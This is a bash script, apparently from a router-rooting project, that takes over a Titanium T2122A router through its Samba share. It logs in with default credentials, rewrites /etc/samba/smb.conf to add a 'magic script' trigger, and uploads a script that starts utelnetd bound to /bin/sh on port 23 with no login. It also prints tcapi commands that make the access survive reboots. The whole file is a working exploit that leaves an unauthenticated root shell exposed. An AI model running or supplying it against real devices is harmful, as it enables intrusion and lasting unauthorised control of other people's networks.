#!/usr/bin/env bash
# Enable a root telnet shell on a Titanium T2122A through Samba's magic script.
#
# Usage: ./samba_telnet.sh [router-ip] [samba-user] [samba-password]
# Defaults: 192.168.1.1 admin 1234
#
# Requires: smbclient, python3, bash. The stock Samba share must be enabled and
# must map to "/" (the Excitel default). See docs/SAMBA-TELNET.md.

set -euo pipefail

HOST="${1:-192.168.1.1}"
USER="${2:-admin}"
PASS="${3:-1234}"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if ! command -v smbclient >/dev/null 2>&1; then
    echo "error: smbclient is not installed (package: samba-client)" >&2
    exit 2
fi

SMB=(smbclient -s "$HERE/smb.conf" "//$HOST/Samba_Share" -U "$USER%$PASS")
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

echo "[1/4] downloading /etc/samba/smb.conf"
"${SMB[@]}" -c "get /etc/samba/smb.conf $TMP/smb.conf" >/dev/null

echo "[2/4] adding: magic script = telnet_start.sh"
python3 - "$TMP/smb.conf" <<'PY'
import sys

path = sys.argv[1]
with open(path, encoding="utf-8", errors="surrogateescape") as f:
    text = f.read()

needle = "[Samba_Share]\npath = /\n"
if needle not in text:
    # Fall back to the section header and insert after its path line.
    start = text.find("[Samba_Share]")
    if start < 0:
        sys.exit("error: [Samba_Share] not found in smb.conf")
    end = text.find("\n[", start + 1)
    if end < 0:
        end = len(text)
    block = text[start:end]
    if "magic script" in block:
        print("magic script already present")
        sys.exit(0)
    text = text[:end] + "\nmagic script = telnet_start.sh" + text[end:]
else:
    if "magic script" in text:
        print("magic script already present")
        sys.exit(0)
    text = text.replace(needle, needle + "magic script = telnet_start.sh\n", 1)

with open(path, "w", encoding="utf-8", errors="surrogateescape") as f:
    f.write(text)
print("modified")
PY

echo "[3/4] uploading smb.conf and trigger"
"${SMB[@]}" -c "put $TMP/smb.conf /etc/samba/smb.conf" >/dev/null

cat > "$TMP/telnet_start.sh" <<'EOF'
#!/bin/sh
/usr/bin/utelnetd -p 23 -l /bin/sh -d
EOF

"${SMB[@]}" -c "put $TMP/telnet_start.sh /tmp/telnet_start.sh" >/dev/null
sleep 2

echo "[4/4] checking TCP 23"
if timeout 3 bash -c "echo >/dev/tcp/$HOST/23" 2>/dev/null; then
    echo "OK: root shell is listening on $HOST:23"
    echo "    telnet $HOST 23"
    echo
    echo "To keep access after a reboot, run this in the shell:"
    echo "    /userfs/bin/tcapi set Account_TelnetEntry Active Yes"
    echo "    /userfs/bin/tcapi commit Account_TelnetEntry"
    echo "    /userfs/bin/tcapi save"
else
    echo "port 23 is still closed." >&2
    echo "Toggle Samba off/on in the web UI, then run this script again." >&2
    exit 1
fi
